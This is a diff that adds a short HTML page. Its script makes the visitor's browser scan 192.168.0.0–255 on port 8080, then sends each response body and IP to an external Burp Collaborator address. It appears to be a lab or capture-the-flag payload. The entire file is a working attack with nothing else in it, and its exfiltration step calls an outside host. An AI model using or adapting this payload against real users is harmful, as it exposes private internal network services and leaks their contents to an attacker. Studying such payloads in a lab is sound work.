@@ -1,0 +1,18 @@
+<html>
+    <script>
+        collaboratorURL = 'http://d4i329wl1e1wjgh7cec94oo51w7mvb.burpcollaborator.net'
+
+        for (let i=0; i<256; i++){
+            fetch('http://192.168.0.' + i + ':8080')
+            .then(response => response.text())
+            .then (text => {
+                try {
+
+                fetch(collaboratorURL + '?ip=' + 'http://192.168.0.' + i + "&code=" + encodeURIComponent(text))
+                } catch(err){
+
+                }
+            })
+        }
+    </script>
+</html>
